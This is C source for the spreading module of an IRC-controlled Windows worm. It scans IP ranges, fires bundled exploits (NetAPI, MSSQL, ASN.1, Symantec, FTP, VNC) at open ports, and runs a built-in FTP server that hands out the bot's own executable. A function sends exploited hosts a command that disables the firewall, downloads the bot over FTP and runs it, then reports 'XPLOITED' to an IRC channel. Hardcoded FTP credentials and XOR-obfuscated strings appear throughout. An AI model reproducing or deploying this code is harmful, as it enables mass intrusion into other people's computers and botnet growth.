//#include "shared.h"

#include "sym.h"
#include "vncps.h"
#include "netapi.h"
#include "mssql.cpp"
#include "ntapi.cpp"
#include "ms04_007_asn1.cpp"
#include "ftpsplo.cpp"
#include "navi.cpp"
#include "sami.cpp"


//#include "MS0640.cpp"
typedef struct
{
	char			*host;
	unsigned short	port;
} off_hosts_s;

typedef struct
{
	int		threads;
	char	*range;
	int		rnd;
	int		cftp;
	char	*lanip;
} off_scan_s;

/////////////////
// config here //
/////////////////

char	cfg_cftp_host[128] = "ftp.my-place.us";
int		cfg_cftp_port = 21;
char	cfg_cftp_user[32] = "mp_619821";
char	cfg_cftp_pass[32] = "ghd0minat3";
char	cfg_cftp_file[32] = "lretscr.exe";

char cfg_exchannel[] = "\x8E\xDE\xD5\xD4\xCE\xC5\xCC\xD9";
char cfg_ftpchannel[] = "\x8E\xDE\xD5\xD4\xCE\xC5\xCC\xD9";


int		cfg_off_time = 1800; // sec
int		cfg_post_off_time = 30; // sec

off_hosts_s offhosts[] = {
	{ "www.google.com", 80 },
	{ "www.yahoo.com", 80 },
	{ NULL, 0 }
};

off_scan_s offscans[] = {
	{ 64, "b", 0, 0, NULL },
//	{ 48, "y", 0, 1, "83.0.0.0" },
	{ 0, NULL, 0, 0, NULL }
};

char cfg_ftp_user[] = "\xFE\xC4\xE3\xC4\xFE\xF9\xE8\xFF";
char cfg_ftp_pass[] = "\xCA\xC5\xC9\x9D\xC0\xC4\xC3\xCC\xD9\x9E";
int		cfg_ftpdmaxwaittime = 60; // sec
char strExploited[] = "\xE8\xD5\xDD\xC1\xC2\xC4\xD9\xC8\xC9\x97";
char strex1[] = "\xFE\xC5\xCC\xDF\xC8\xC9\xEC\xCE\xCE\xC8\xDE\xDE";
char strex2[] = "\xC8\xCE\xC5\xC2";
char strex3[] = "\xCB\xD9\xDD";
char strex4[] = "\xC3\xC8\xD9";
char strex5[] = "\xDE\xD9\xCC\xDF\xD9";
char strex6[] = "\xD8\xDE\xC8\xDF";
char strex7[] = "\xCE\xC0\xC9";
char strex8[] = "\xC2\xDD\xC8\xC3";
char strex9[] = "\xC8\xD5\xC8";
// not encoded strings
static char string_cserror[] = "Failed to initialize critical section.";
static char string_scanning[] = "Scanning";
static char string_ftpderror[] = "FTPD Error:";
static char string_scanoff1[] = "\xF9\xD8\xDF\xC3\xC4\xC3\xCA";
static char string_scanoff2[] = "\xDE\xDD\xDF\x9E\x99\xC9";
static char string_scanoff3[] = "\xC2\xCB\xCB\x83\x83\x83";
static char string_alreadyscan1[] = "\xFE\xDD\xDF\x9E\x99\xC9";
static char string_alreadyscan2[] = "\xCC\xC1\xDF\xC8\xCC\xC9\xD4";
static char string_alreadyscan3[] = "\xDF\xD8\xC3\xC3\xC4\xC3\xCA\x83";
static char string_ftpdstart[] = "\xF9\xDF\xCC\xC3\xDE\xCB\xC8\xDF\xC4\xC3\xCA";
static char string_ftpdstart1[] = "\xD9\xC2\x97";
static char string_ftpddone[] = "\xF9\xDF\xCC\xC3\xDE\xCB\xC8\xDF\xC8\xC9";
static char string_ftpddone1[] = "\xD9\xC2\x97";


static char string_ftpd_220[] = "220 Hello!\r\n";
static char string_ftpd_530[] = "530 Login or Password incorrect.\r\n";
static char string_ftpd_331[] = "331 Password required.\r\n";
static char string_ftpd_230[] = "230 User logged in.\r\n";
static char string_ftpd_221[] = "221 Bye.\r\n";
static char string_ftpd_200[] = "200 PORT command successful.\r\n";
static char string_ftpd_150[] = "150 Opening BINARY mode data connection.\r\n";
static char string_ftpd_425[] = "425 Can't open data connection.\r\n";
static char string_ftpd_226[] = "226 Transfer ok.\r\n";

/////////////////
// config ends //
/////////////////

typedef struct 
{
	char	ip[16];
	char	r;
	char	myip[16];
	int		rnd;
	int		cftp;
	SOCKET	ircsock;
	int		tnum;
} scan_s;

typedef void (*efref)(exparam_s exparam);

typedef struct
{
	unsigned short	port;
	BOOL			opened;
	efref			func;
} port_s;

typedef struct
{
	int		tnum;
	SOCKET	ircsock;
} ftpd_s;

typedef struct
{
	int		tnum;
	SOCKET	ircsock;
	SOCKET	clsock;
} ftpd_client_s;

typedef struct
{
	int				errorcode;
	char			user[32];
	char			pass[32];
	char			ip[16];
	unsigned short	tport;
} ftpd_cldata_s;

CRITICAL_SECTION	CS;
unsigned long		extip;
int					ipnum;
BOOL				bScanON;
unsigned short		ftp_port;


void Spreader_IRC_Send(SOCKET sock, ircmessage msg, char *buffer, char *to)
{
	if (sock > 0)
		IRC_Send(sock, msg, buffer, to);
}


int Spreader_FTPD_Send(SOCKET sock, char *data)
{
	return send(sock, data, strlen(data), 0);
}


int Spreader_FTPD_CheckTimeout(SOCKET sock)
{
	struct timeval		timeout;
	fd_set				fd;

	timeout.tv_sec = cfg_ftpdmaxwaittime;
	timeout.tv_usec = 0;

	FD_ZERO(&fd); 
	FD_SET(sock, &fd);

	return select(sock, &fd, NULL, NULL, &timeout);
}


int Spreader_FTPD_FileSend(SOCKET dsock) 
{
	FILE			*fp = NULL;
	char			tfile[MAX_PATH], buff[1024];
	int				r, total = 0;

	GetModuleFileName(NULL, tfile, sizeof(tfile));

	fp = fopen(tfile, "rb");
	if (fp == NULL)
	{
#ifdef DEBUG
	//	printf("Failed to open file: %s\n", tfile);
#endif
		return -6;
	}

	while (!feof(fp))
	{
		memset(buff, 0, sizeof(buff));
		r = fread(buff, 1, sizeof(buff), fp);
		if (send(dsock, buff, r, 0) == SOCKET_ERROR)
			return -7;
		total += r;
	}

#ifdef DEBUG
//	printf("Finished sending file: %s, total: %d bytes\n", tfile, total);
#endif

	fclose(fp);
	closesocket(dsock);

	return total;
}


int Spreader_FTPD_FileConnect(char *ip, unsigned short port)
{
	struct sockaddr_in	server;
	SOCKET				dsock;

	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(port);

#ifdef DEBUG
	printf("Connecting to: %s:%d\n", ip, port);
#endif

	dsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (connect(dsock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) 
	{
		closesocket(dsock);
		return -5;
	}
	else
		return Spreader_FTPD_FileSend(dsock);
}


ftpd_cldata_s Spreader_FTPD_Parse(SOCKET ircsock, SOCKET sock, char *data, ftpd_cldata_s d)
{
	char tmp1[MAX_LINE];
	char tmp2[MAX_LINE];
	char tmp3[MAX_LINE];
	char			*word[MAX_WORDS];
	int				i = 0;

	word[i] = strtok(data, " ");
	while (word[i] != NULL)
	{
		i++;
		if (i == MAX_WORDS)
			break;
		word[i] = strtok(NULL, " ");
	}

	d.errorcode = 0;

	if (word[0] == NULL)
		return d;

	else if (!strcmp(word[0], "QUIT"))	
	{
		Spreader_FTPD_Send(sock, string_ftpd_221);
		d.errorcode = -3;

		return d;
	}

	else if (word[1] == NULL)
		return d;

	else if (!strcmp(word[0], "USER"))
	{
		strncpy(d.user, word[1], sizeof(d.user) - 1);
		Spreader_FTPD_Send(sock, string_ftpd_331);

		return d;
	}

	else if (!strcmp(word[0], "PASS"))
	{
		strncpy(d.pass, word[1], sizeof(d.pass) - 1);

	_snprintf(tmp1, sizeof(tmp1), "%s", Decode(cfg_ftp_user));
	_snprintf(tmp2, sizeof(tmp2), "%s", Decode(cfg_ftp_pass));
		if (!strcmp(d.user, tmp1) && !strcmp(d.pass, tmp2))
		{
			Spreader_FTPD_Send(sock, string_ftpd_230);

			return d;
		}
		else
		{
			Spreader_FTPD_Send(sock, string_ftpd_530);
			d.errorcode = -4;

			return d;
		}
	}

	else if (!strcmp(word[0], "PORT"))
	{
		int		d1 = -1,
				d2 = -1,
				d3 = -1,
				d4 = -1,
				d5 = -1, 
				d6 = -1;
		char	p[50];

		sscanf(word[1], "%d,%d,%d,%d,%d,%d", &d1, &d2, &d3, &d4, &d5, &d6);

		_snprintf(d.ip, sizeof(d.ip) - 1, "%d.%d.%d.%d", d1, d2, d3, d4);

		memset(p, 0, sizeof(p));
		sprintf(p, "%x%x\n", d5, d6);
		d.tport = (unsigned short)strtoul(p, NULL, 16);

		Spreader_FTPD_Send(sock, string_ftpd_200);

		return d;
	}

	else if (!strcmp(word[0], "RETR"))
	{
		char	buffer[MAX_LINE];

		Spreader_FTPD_Send(sock, string_ftpd_150);

		_snprintf(buffer, sizeof(buffer) - 1, "%s %s %s:%d.", Decode(string_ftpdstart), Decode(string_ftpdstart1), d.ip, d.tport);
		_snprintf(tmp3, sizeof(tmp3), "%s", Decode(cfg_ftpchannel));
		Spreader_IRC_Send(ircsock, MSG_PRIVMSG, buffer, tmp3);
		memset(buffer, 0, sizeof(buffer));

		d.errorcode = Spreader_FTPD_FileConnect(d.ip, d.tport);

		if (d.errorcode < 0)
			Spreader_FTPD_Send(sock, string_ftpd_425);
		else
		{
			Spreader_FTPD_Send(sock, string_ftpd_226);

			_snprintf(buffer, sizeof(buffer) - 1, "%s %s %s:%d, %d kB.", Decode(string_ftpddone), Decode(string_ftpddone1), d.ip, d.tport, d.errorcode / 1024);
			Spreader_IRC_Send(ircsock, MSG_PRIVMSG, buffer, tmp3);
			memset(buffer, 0, sizeof(buffer));
		}

		return d;
	}

	else
		return d;
}


int Spreader_FTPD_Receive(SOCKET ircsock, SOCKET sock)
{
	int				ret, 
					len;
	char			buffer[MAX_RECEIVE_BUFFER];
	ftpd_cldata_s	d;

	d.errorcode = 0;
	d.pass[0] = 0;
	d.user[0] = 0;
	d.ip[0] = 0;
	d.tport = 0;

	while (sock > 0)
	{
		len = 0;
		memset(buffer, 0, sizeof(buffer));
		while ((ret = Spreader_FTPD_CheckTimeout(sock)) > 0)
		{
			if (len == MAX_RECEIVE_BUFFER - 1)
				break;
			len += recv(sock, buffer + len, 1, 0);
			if (buffer[len-1] == '\r' || buffer[len-1] == '\n')
				break;
		}
		
		if (ret <= 0)
			return -2;
		else if (len < 2)
			continue;
		else
		{
			buffer[len-1] = 0;
			d = Spreader_FTPD_Parse(ircsock, sock, buffer, d);
			if (d.errorcode != 0)
				return d.errorcode;
		}
	}

	return -1;
}


DWORD WINAPI Spreader_FTPD_Client(LPVOID param)
{
	SOCKET			sock;
	ftpd_client_s	fc = *((ftpd_client_s *)param);

	sock = fc.clsock;

	Spreader_FTPD_Send(sock, string_ftpd_220);

	Spreader_FTPD_Receive(fc.ircsock, sock);

	/*
	Error codes returned by Spreader_FTPD_Receive:
	0 = reserved
	-1 = socket error
	-2 = connection time-out
	-3 = client issued BYE command
	-4 = wrong user/pass
	-5 = failed to connect to new port
	-6 = failed to open local file for transfer
	-7 = socker error during transfer
	*/

	closesocket(sock);

	Thread_Clear(fc.tnum);
	ExitThread(0);
}


int Spreader_FTPD_Main(SOCKET ircsock)
{
	DWORD				id = 0;
	int					on;
	SOCKET				sock, 
						clsock;
	unsigned long		mode = 1;
	struct sockaddr_in	sin;
	int					ssize = sizeof(sin);
	ftpd_client_s		fc;

	if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
		return -1;

	setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on));

	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = 0;
	sin.sin_port = htons(ftp_port);

	if (bind(sock, (struct sockaddr *)&sin, ssize) == SOCKET_ERROR)
		return -2;

	listen(sock, FTPD_MAX_PENDING);

#ifdef DEBUG
	//printf("FTPD on: %d\n", ftp_port);
#endif

	fc.ircsock = ircsock;

	while (bScanON) 
	{
		clsock = SOCKET_ERROR;

		while (clsock == SOCKET_ERROR ) 
		{
			clsock = accept(sock, (struct sockaddr *)&sin, &ssize);
		}

		if (clsock != INVALID_SOCKET) 
		{
			fc.clsock = clsock;
			fc.tnum = Thread_Add(T_FTPDC);

			threads[fc.tnum].tHandle = Thread_Start(Spreader_FTPD_Client, &fc, FALSE);
		}
	}

	closesocket(sock);

#ifdef DEBUG
	printf("Shutting ftpd down.\n");
#endif

	return 0;
}


DWORD WINAPI Spreader_FTPD_Thread(LPVOID param) 
{
	int		e;
	char	buffer[MAX_LINE];
	ftpd_s	f = *((ftpd_s *)param);
char tmp2[MAX_LINE];
	e = Spreader_FTPD_Main(f.ircsock);

	if (e < 0)
	{
		_snprintf(buffer, sizeof(buffer) - 1, "%s %d.", string_ftpderror, e);
	_snprintf(tmp2, sizeof(tmp2), "%s", Decode(cfg_ftpchannel));
		Spreader_IRC_Send(f.ircsock, MSG_PRIVMSG, buffer, tmp2);
		memset(buffer, 0, sizeof(buffer));
	}

	/*
	Error codes returned by Spreader_FTPD_Main:
	0 = ftpd shutdown
	-1 = socket error
	-2 = bind error (port already in use?)
	*/

	Thread_Clear(f.tnum);
	ExitThread(0);
}


BOOL Spreader_Port(SOCKET sock, unsigned long ip, unsigned short port) 
{
	struct sockaddr_in	sin;
	unsigned long		blockcmd = 1;
	TIMEVAL				tv;
	int					i;
	FD_SET				rset;

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) 
		return FALSE;

	sin.sin_family = AF_INET;
	sin.sin_addr.S_un.S_addr = ip;
	sin.sin_port = htons(port);

	ioctlsocket(sock, FIONBIO, &blockcmd);
	connect(sock, (struct sockaddr *)&sin, sizeof(sin));

	tv.tv_sec = PSCAN_DELAY;
	tv.tv_usec = 0;
	
	FD_ZERO(&rset);
	FD_SET(sock, &rset);

	i = select(0, 0, &rset, 0, &tv);

	closesocket(sock);

	if (i <= 0) 
		return FALSE;
	else 
		return TRUE;
}


unsigned long Spreader_GetRandIP(char *ip)
{
	int				ipx[4] = { -1, -1, -1, -1},
					i;

	sscanf(ip, "%d.%d.%d.%d", &ipx[0], &ipx[1], &ipx[2], &ipx[3]);
	
	for (i = 0; i < 4; i++)
	{
		if (ipx[i] == -1)
			ipx[i] = rand()%256;
	}

	return (ipx[0] + (ipx[1] << 8) + (ipx[2] << 16) + (ipx[3] << 24));
}


void Spreader_AdjustNextSeqIP(char p)
{
	extip = ntohl(extip);
	extip++;
	ipnum++;

	if (p == 'c' && ipnum == 256)
	{
		extip -= 256;
		ipnum = 0;
	}
	else if ((p == 'b' || p == 'y') && ipnum == 65536)
	{
		extip -= 65536;
		ipnum = 0;
	}
	else if (p == 'a' && ipnum == 16777216)
	{
		extip -= 16777216;
		ipnum = 0;
	}
	else
		ipnum = 0;

	extip = htonl(extip);
}


DWORD WINAPI Spreader_Thread(LPVOID param)
{
	unsigned long	localip;
	int				i;
	exparam_s		exparam;
	scan_s			s = *((scan_s *)param);
	char			buffer[MAX_LINE];
	IN_ADDR			in;
char tmp3[MAX_LINE];
char tmp4[MAX_LINE];
char tmp5[MAX_LINE];
	port_s p[] = {
#ifndef NO_SYM
		{ 2967, FALSE, SYMExploit },
		{ 2968, FALSE, SYMExploit },
#endif
#ifndef NO_VNC
		{ 5900, FALSE, VNCPassCheck },
#endif//NETAPIExploit
#ifndef NO_NAPI
        { 445, FALSE,netapi_exploit },
		{ 445, FALSE,NETAPIExploit },
		     { 135, FALSE,netapi_exploit },
		{ 135, FALSE,NETAPIExploit },
		     { 139, FALSE,netapi_exploit },
		{ 139, FALSE,NETAPIExploit },
		{ 1433, FALSE, MSSQL},
		   // { "asn1http",   "asn1http",      80, MS04_007_MSASN1_PortedByScriptGod, 0, TRUE, TRUE },
    { 445, FALSE, MS04_007_MSASN1_PortedByScriptGod},
    { 139, FALSE, MS04_007_MSASN1_PortedByScriptGod},
	 { 21, FALSE, ftpsplo},
	  { 21, FALSE, sami},
	  { 80, FALSE, navi},
#endif
		{ 0, FALSE, NULL}
	};

	exparam.cftp = s.cftp;
	exparam.ircsock = s.ircsock;
	exparam.ftp_port = ftp_port;
	_snprintf(tmp3, sizeof(tmp3), "%s", Decode(cfg_ftp_user));
	_snprintf(tmp4, sizeof(tmp4), "%s", Decode(cfg_ftp_pass));
	_snprintf(tmp5, sizeof(tmp5), "%s", Decode(cfg_exchannel));
	strncpy(exparam.ftp_user, tmp3, sizeof(exparam.ftp_user) - 1);
	strncpy(exparam.ftp_pass, tmp4, sizeof(exparam.ftp_pass) - 1);
	strncpy(exparam.channel, tmp5, sizeof(exparam.channel) - 1);
	strncpy(exparam.myip, s.myip, sizeof(exparam.myip) - 1);
	exparam.myip[sizeof(exparam.myip) - 1] = 0;

	while (bScanON)
	{
		for (i = 0; p[i].port != 0; i++)
			p[i].opened = FALSE;

		if (s.rnd)
			localip = Spreader_GetRandIP(s.ip);
		else
		{
			EnterCriticalSection(&CS);

			Spreader_AdjustNextSeqIP(s.r);
			localip = extip;

			LeaveCriticalSection(&CS);
		}

		in.s_addr = localip;

#ifdef DEBUG	
	//	printf("Chkin: %s\n", inet_ntoa(in));
#endif

		for (i = 0; p[i].port != 0; i++)
			p[i].opened = Spreader_Port(threads[s.tnum].tsock, localip, p[i].port);


		for (i = 0; p[i].port != 0; i++)
		{
			if (p[i].opened)
			{
#ifdef DEBUG
	//			printf("Port opened: %s:%d\n", inet_ntoa(in), p[i].port);
#endif
				exparam.ip = localip;
				exparam.port = p[i].port;
				strncpy(exparam.ip_char, inet_ntoa(in), sizeof(exparam.ip_char) - 1);
				exparam.ip_char[sizeof(exparam.ip_char) - 1] = 0;

				_snprintf(buffer, sizeof(buffer) - 1, "Port opened: %s:%d", exparam.ip_char, exparam.port);
				Spreader_IRC_Send(exparam.ircsock, MSG_PRIVMSG, buffer, exparam.channel);
				memset(buffer, 0, sizeof(buffer));

				p[i].func(exparam);
			}
		}
	}
	
	Thread_Clear(s.tnum);
	ExitThread(0);
}


void Spreader_Start(SOCKET ircsock, char *channel, int thrds, char *range, int rnd, int cftp, char *lanrange, char *myip)
{
	char	buffer[MAX_LINE];
	char	ip[16] = {0};
	int		ipx[4] = { -1, -1, -1, -1},
			i,
			tthrds = 0;

	if (Thread_Check(T_SCAN))
	{
		char tp2[MAX_LINE];
		_snprintf(tp2, sizeof(tp2), "%s %s %s", Decode(string_alreadyscan1), Decode(string_alreadyscan2), Decode(string_alreadyscan3)); 
		Spreader_IRC_Send(ircsock, MSG_PRIVMSG, tp2, channel);
		memset(buffer, 0, sizeof(buffer));
		return;
	}

	DeleteCriticalSection(&CS);

	if (!InitializeCriticalSectionAndSpinCount(&CS, 0x80000400)) 
	{
		Spreader_IRC_Send(ircsock, MSG_PRIVMSG, string_cserror, channel);
		memset(buffer, 0, sizeof(buffer));
		return;
	}

	if (ircsock != 0)
	{
		BOOL	lanbot = IsLanBot(ircsock);

		if (!lanbot && cftp == 1)
			cftp = 1;

		if (lanrange != NULL && IsLanBot(ircsock))
			sscanf(lanrange, "%d.%d.%d.%d", &ipx[0], &ipx[1], &ipx[2], &ipx[3]);
		else
			sscanf(GetMyIP(ircsock), "%d.%d.%d.%d", &ipx[0], &ipx[1], &ipx[2], &ipx[3]);
	}
	else
	{
		if (channel == NULL && cftp == 1)
			cftp = 1;

		if (lanrange != NULL && channel != NULL)
			sscanf(lanrange, "%d.%d.%d.%d", &ipx[0], &ipx[1], &ipx[2], &ipx[3]);
		else
			sscanf(myip, "%d.%d.%d.%d", &ipx[0], &ipx[1], &ipx[2], &ipx[3]);
	}

	if (!strcmp(range, "b"))
	{		
		ipx[2] = 0;
		ipx[3] = 0;
	}
	else if (!strcmp(range, "a"))
	{
		ipx[1] = 0;
		ipx[2] = 0;
		ipx[3] = 0;
	}
	else if (!strcmp(range, "c"))
	{
		ipx[3] = 0;
	}
	else if (!strcmp(range, "y"))
	{
		ipx[1] = rand()%256;
		ipx[2] = 0;
		ipx[3] = 0;
	}
	else
	{
		for (i = 0; i < 4; i++)
			ipx[i] = -1;
		sscanf(range, "%d.%d.%d.%d", &ipx[0], &ipx[1], &ipx[2], &ipx[3]);
	}

	if (rnd)
	{
		ipx[3] = -1;
		if (strcmp(range, "c"))
		{
			ipx[2] = -1;
			if (!strcmp(range, "a"))
				ipx[1] = -1;
		}
	}

	for (i = 0; i < 4; i++)
	{
		if (ipx[i] == -1)
		{
			if (rnd)
				_snprintf(ip, sizeof(ip), "%sx.", ip);
			else
				_snprintf(ip, sizeof(ip), "%s0.", ip);
		}
		else
			_snprintf(ip, sizeof(ip) - 1, "%s%d.", ip, ipx[i]);
	}

	ip[strlen(ip)-1] = 0;

	if (!rnd)
		extip = inet_addr(ip);

	bScanON = TRUE;

/*	if (cftp)
	{
		ftp_port = 2823;
		ftpd_s ftp;
		ftp.ircsock = ircsock;
		ftp.tnum = Thread_Add(T_FTPD);
		threads[ftp.tnum].tHandle = Thread_Start(Spreader_FTPD_Thread, &ftp, FALSE);
	}*/
	if (!cftp)
	{
		ftp_port = 2823;
		ftpd_s ftp;
		ftp.ircsock = ircsock;
		ftp.tnum = Thread_Add(T_FTPD);
		threads[ftp.tnum].tHandle = Thread_Start(Spreader_FTPD_Thread, &ftp, FALSE);
	}

	scan_s s;
	s.ircsock = ircsock;
	s.rnd = rnd;
	s.cftp = cftp;
	strcpy(s.ip, ip);

	if (myip == NULL)
		strncpy(s.myip, GetMyIP(ircsock), sizeof(s.myip) - 1);
	else
		strcpy(s.myip, myip);

	if (strlen(range) == 1)
		s.r = range[0];
	else
		s.r = 'i';

	for (i = 0; i < thrds; i++)
	{
		s.tnum = Thread_Add(T_SCAN);

		if (s.tnum != -1)
		{
			if ((threads[s.tnum].tHandle = Thread_Start(Spreader_Thread, &s, FALSE)) != NULL)
				tthrds++;
		}
	}

	_snprintf(buffer, sizeof(buffer) - 1, "%s: %s, threads: %d, cftp: %d", string_scanning, ip, tthrds, cftp);
	Spreader_IRC_Send(ircsock, MSG_PRIVMSG, buffer, channel);
	memset(buffer, 0, sizeof(buffer));
}


void Spreader_Stop(SOCKET ircsock, char *channel)
{
	char tp1[MAX_LINE];
	bScanON = FALSE;
	_snprintf(tp1, sizeof(tp1), "%s %s %s", Decode(string_scanoff1), Decode(string_scanoff2), Decode(string_scanoff3));
	Spreader_IRC_Send(ircsock, MSG_PRIVMSG, tp1, channel);
	Sleep(2000);
	Thread_Kill(T_SCAN);
}


void Spreader_GetCFTP(SOCKET ircsock, char *channel)
{
	char	buffer[MAX_LINE];

	_snprintf(buffer, sizeof(buffer) - 1, "Hst: %s, prt: %d, usr: %s, pss: %s, fle: %s.", 
		cfg_cftp_host, cfg_cftp_port, cfg_cftp_user, cfg_cftp_pass, cfg_cftp_file);
	Spreader_IRC_Send(ircsock, MSG_PRIVMSG, buffer, channel);
	memset(buffer, 0, sizeof(buffer));
}


void Spreader_Offline()
{
	int		httpsock,
			i = 0,
			scans;
	char	*lan = NULL;

	if (Thread_Check(T_SCAN))
		return;

	scans = (sizeof(offscans) / 20) - 1;

	if (scans < 1)
		return;

#ifdef DEBUG
	printf("Starting offline Xlr...\n");
#endif

	while ((httpsock = IRC_Connect(offhosts[i].host, offhosts[i].port)) <= 0)
	{
		i++;
		if (offhosts[i].host == NULL)
			return;
	}

	if (IsLanBot(httpsock))
		lan = offhosts[i].host;

	i = rand()%scans;

	Spreader_Start(0, lan, offscans[i].threads, offscans[i].range, offscans[i].rnd, 
					offscans[i].cftp, offscans[i].lanip, GetMyIP(httpsock));

	closesocket(httpsock);

	Sleep(cfg_off_time * 1000);

#ifdef DEBUG
	printf("Terminating offline Xlr...\n");
#endif

	bScanON = FALSE;

#ifdef DEBUG
	printf("Reconnecting to irc servers in %d seconds.\n", cfg_post_off_time);
#endif

	Sleep(cfg_post_off_time * 1000);
	
	Thread_Kill(T_SCAN);
}


void Spreader_ConnectShell(exparam_s exparam, unsigned short port) 
{
	char				recvbuf[1024],
						buff[512],
						file[8];
	SOCKET				sockfd;
	char buff11[69],buff2[69],buff3[69],buff4[69],buff5[69],buff6[69],buff7[69],buff8[69],buff9[69],buff10[69];
	struct sockaddr_in	shell_addr;
	//char tmp4[MAX_LINE];
//char tmp5[MAX_LINE];
_snprintf(buff11, sizeof(buff11), "%s", Decode(strExploited));
_snprintf(buff2, sizeof(buff2), "%s", Decode(strex1));
_snprintf(buff3, sizeof(buff3), "%s", Decode(strex2));
_snprintf(buff4, sizeof(buff4), "%s", Decode(strex3));
_snprintf(buff5, sizeof(buff5), "%s", Decode(strex4));
_snprintf(buff6, sizeof(buff6), "%s", Decode(strex5));
_snprintf(buff7, sizeof(buff7), "%s", Decode(strex6));
_snprintf(buff8, sizeof(buff8), "%s", Decode(strex7));
_snprintf(buff9, sizeof(buff9), "%s", Decode(strex8));
_snprintf(buff10, sizeof(buff10), "%s", Decode(strex9));
	
shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = exparam.ip;
	shell_addr.sin_port = htons(port);

	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return;

	if (connect(sockfd,(struct sockaddr *)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) 
		return;

	recv(sockfd, recvbuf, 1024, 0);

	_snprintf(file, sizeof(file) - 1, "%s.exe", GenerateRandomLetters(2));

if (exparam.cftp)
		_snprintf(buff, sizeof(buff), 
			"cmd /c net stop SharedAccess &echo open %s %d >> tj &echo user %s %s >> tj &echo binary >> tj &echo get %s >> tj &echo bye >> tj &ftp -n -v -s:tj &del tj &%s &net start SharedAccess\r\n",	
				cfg_cftp_host, cfg_cftp_port, cfg_cftp_user, cfg_cftp_pass, cfg_cftp_file, cfg_cftp_file);
	else
		_snprintf(buff, sizeof(buff), 
			"cmd /c net stop SharedAccess &echo open %s %d >> tj &echo user %s %s >> tj &echo get %s >> tj &echo bye >> tj &ftp -n -v -s:tj &del tj &%s &net start SharedAccess\r\n",	
				exparam.myip, ftp_port, cfg_ftp_user, cfg_ftp_pass, file, file);

	if (send(sockfd, buff, strlen(buff) ,0) == -1)
		return;

	recv(sockfd, recvbuf, 1024, 0);

	closesocket(sockfd);

	_snprintf(recvbuf, sizeof(recvbuf) - 1, "XPLOITED: %s:%d", exparam.ip_char, exparam.port);
	Spreader_IRC_Send(exparam.ircsock, MSG_PRIVMSG, recvbuf, exparam.channel);
	memset(recvbuf, 0, sizeof(recvbuf));
}
